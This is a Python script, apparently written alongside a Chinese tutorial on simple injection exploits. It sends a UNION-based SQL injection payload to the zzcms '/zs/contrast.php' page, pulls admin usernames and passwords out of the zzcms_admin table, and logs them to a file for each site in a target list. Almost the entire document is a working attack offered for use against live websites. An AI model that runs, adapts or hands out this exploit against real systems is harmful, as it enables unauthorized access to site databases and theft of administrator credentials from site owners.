#配合“python简单注入exp编写”使用
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import re
from lxml import etree

def opt2File(str):
	try:
		f = open('result.txt','a')
		f.write(str + '\n')
	finally:
		f.close()
def runSqlInjectExp(website):
	sqlInjectExp = {
		u'id[0]' : u"1) union select 1, CONCAT(0x73,0x71,0x6c,0x49,0x6e,0x6a,0x65,0x63,0x74,0x46,0x6c,0x61,0x67,0x5b,0x23,admin,0x7c,pass,0x23,0x5d,0x73,0x71,0x6c,0x49,0x6e,0x6a,0x65,0x63,0x74,0x46,0x6c,0x61,0x67),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1, NULL,1,1,1,1,1,1,1,1,1,1,1,1, NULL,1,1,1,1,1,1,1 from zzcms_admin#"
	}
	if website is None:
		return
	if u'http://' not in website:
		website = u'http://' + website
	try:
		requests.get(website,timeout=5)
	except:
		print (u'Failed to visit the ' + website + '\n')
		return
	try:
		r = requests.post(website + u'/zs/contrast.php',data=sqlInjectExp,timeout=5)
		htmlObj = r.text.encode('utf-8')
		htmlTree = etree.HTML(htmlObj)
		trData = htmlTree.xpath("//body/table[1]/tr[2]/td")
		sqlInjectResult = []
		for n in trData:
			reResult = re.match(r'sqlInjectFlag\[#([\s\S]*?)#\]sqlInjectFlag',n.text.encode('utf-8'))
			if reResult is not None:
				opt2File(website)
				opt2File('	' + reResult.group(1))
				sqlInjectResult.append(reResult.group(1))
		if sqlInjectResult:
			str = ''
			for result in sqlInjectResult:
				str += result + u' '
			print (target)
			print (str)
	except:
		print (u'Failed to inject the ' + website + '\n')
		return

targets = [
	'http://baidu.com/' #target列表
]
for target in targets:
	runSqlInjectExp(target)